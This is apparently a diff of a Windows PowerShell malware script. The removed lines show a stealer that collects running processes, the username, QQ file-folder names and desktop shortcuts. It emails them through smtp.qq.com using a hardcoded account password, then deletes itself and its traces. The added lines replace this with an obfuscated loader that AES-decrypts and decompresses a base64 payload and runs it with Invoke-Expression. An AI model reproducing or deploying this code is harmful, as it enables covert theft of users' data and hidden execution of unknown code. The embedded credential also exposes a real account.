@@ -1,47 +1,19 @@
-get-process >> 'process.txt'
-$whoami = whoami
-(dir "$home\Documents\Tencent Files").Name >> 'qq.txt'
+$xujvexvck = [System.Convert]::FromBase64String("2nmWSagPfPi4E8feTfDcDiA9V86NPJcjy5B25FjEbQ7ycucQx1WfkFvU9P1MW0e3CFy8Pc3O+LfXMIc0TdGjsJUHhM15p7aRz4oeUXMAJDAaLfP8zw/p1hAVq/klU4/sitWaIxnUvKcZm4iJFekGQNP2k3ZLE8VTmgkWwY5PkMAJI3B2bojPTb2zoDBmmGnGX11XMMJe6d4TsC7JdnfRvZeWS5gFSanGr/t8piZNU6V/eN17zAlAR5td/wXXmSnnAYJ3uXD7yEnEdNPNnPJp+JkoHzwzmDoVkIXn3Y3QvB8RpbWznhXBiwW8+ACM5OgS2PbSqUMuWXERCWRbmauuilTZzIb/2ouPRxQLH09vD94NTeBL6dGBAQDo9utdU+Uo3J65UsLZsLJ4jtLSB50g1RlFFyRHe8RXyDslbX48yjd8U3Xratmj3UidQyhXwyZrqLEULTg7RxBNofkBC2jnfeblW5/dmmSVYqI+5LBCHUaFQzTQv+9saPgfD/zTX/eR9Nfj/xw0J8+161rMGFyKijO+LdbV39tde1Hfy9H4hHOn3GROhtpF5mAfH85vCWwbXhtdGtqM6Uo/4WSVhRzPpFKeq5Vk07hc22CERF1bNFM3wC4HA3S+BTDeR5ev1YDDugjz2WhfsVn2Qq88+CwIM49SkWl9O17yIUeEUDugVgNLfWAGlWjHAPW/qAFS6nGn9hKizzS9I8O2OcGUpQ1hQoOCOTuxdoa/DNd8B9jEaPETAy53Rb2nRqlcsREYwcEqr5bXke8agT72qTyvK7bz1QSJAX6u6D9BLj/71UwE6S7E4J1yGIU4cjfvLHxRqsQg3qf1nL9B8j580UlGU9+E0jhOabC7GDNVJ2I8rf2CV4EfejTP89kq8Pjnqt94L7tbRtO+vBVXuq0Ma2KUw5g2kZ3HzLjiqmNLDwIxKgFOr7zfGrxT6tTbsPB1p2L/RW3sOr+jKDCf9xIs0WOu2qGwQ8rvs8m6VSQ9bLpnRcniNnXJU9H0AuqiZb3FgCvemmnUVg07Cp8P2LJ2MwFkit+WzBFGDzDyq8jxPipufKlqq14oRSB28TTeCKRLzFCM/x08OetejFgVqwmzWhjtSQ9+VsKupoTnLpqAleRq0zXHHVO/cHcJ5Gr/73BkKgWeJ5vVdRIqmyAezk2u/rUM5g104F23fZjOSd4vxydXrhsLuEigNA/fVfpZ/xU5uwTQOI6W3BDtlZi5idg4XfIcKiPz8yQQjB1AS71HM67EYKFii30056PDqi3TCAkOEcJNVulQMP9Sd9lyBnvPT5F7sT6Hp4kvUwSQ/VGHSBGQG3uvufrIySC2A59DpkGdLjnB6wnZGsYyxPpzuDo456RqbJjBSwhk4q8Bnt21MlaBZSf7FMxr017IBrMa9JIGPMsd1djxCTdSGVC7y1r4PN34VicV9L9M+sgzK0lnubKFsIL4D5cMC083MR+6LNq764pW4eiAAGF5WPJcYK/2XkPeVl75/A/ni1XjTj8O23AtNl17Ff4E1J7LXi1eoVCY5hYERHgo")
+$ykpavq = New-Object "System.Security.Cryptography.AesManaged"
+$qywjfho = [System.Convert]::FromBase64String("Z4UuXCrTiFBwdbMAUggdSPsumvS0tnhd7iUT6FV0ES8=")
+$ykpavq.Mode = [System.Security.Cryptography.CipherMode]::CBC
+$ykpavq.KeySize = 192
+$ykpavq.Key = $qywjfho
+$ykpavq.IV = $xujvexvck[0..15]
+$ykpavq.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+$ykpavq.BlockSize = 128
+$jcjgyqw = New-Object System.IO.MemoryStream
+$mjimmskpy = New-Object System.IO.MemoryStream(,$ykpavq.CreateDecryptor().TransformFinalBlock($xujvexvck,16,$xujvexvck.Length-16))
+$hrteqtdg = New-Object System.IO.Compression.DeflateStream $mjimmskpy, ([IO.Compression.CompressionMode]::Decompress)
+$hrteqtdg.CopyTo($jcjgyqw)
+$hrteqtdg.Close()
+$ykpavq.Dispose()
+$mjimmskpy.Close()
+$ovygxus = [System.Text.Encoding]::UTF8.GetString($jcjgyqw.ToArray())
+Invoke-Expression($ovygxus)
 
-$data = dir "$home\Desktop" -filter *.lnk -recurse
-$data | Foreach-Object{
-	Compress-Archive -Update -Path $_.FullName -DestinationPath bakcup.zip
-}
-
-
-
-$smtpServer = "smtp.qq.com"
-$smtpUser = "hk_snow@qq.com"
-$smtpPassword = "vnkaewsoxhjkeafg"
-#create the mail message
-$mail = New-Object System.Net.Mail.MailMessage
-#set the addresses
-$MailAddress="hk_snow@qq.com"
-$MailtoAddress="hk_snow@qq.com"
-$mail.From = New-Object System.Net.Mail.MailAddress($MailAddress)
-$mail.To.Add($MailtoAddress)
-#set the content
-$mail.Subject = $whoami;
-$mail.Priority = "High"
-$mail.Body = 'hk_snow'
-$filename="bakcup.zip"	#add file
-$attachment = new-Object System.Net.Mail.Attachment($filename)
-$mail.Attachments.Add($attachment)
-
-$filename1="process.txt"	#add file
-$attachment1 = new-Object System.Net.Mail.Attachment($filename1)
-$mail.Attachments.Add($attachment1)
-
-$filename2="qq.txt"	#add file
-$attachment2 = new-Object System.Net.Mail.Attachment($filename2)
-$mail.Attachments.Add($attachment2)
-
-#send the message
-$smtp = New-Object System.Net.Mail.SmtpClient -argumentList $smtpServer
-$smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList $smtpUser,$smtpPassword
-$smtp.Send($mail)
-$mail.Attachments.Dispose()
-remove-item $MyInvocation.MyCommand.Path -force
-
-remove-item 'process.txt'
-remove-item 'qq.txt'
-remove-item 'bakcup.zip'
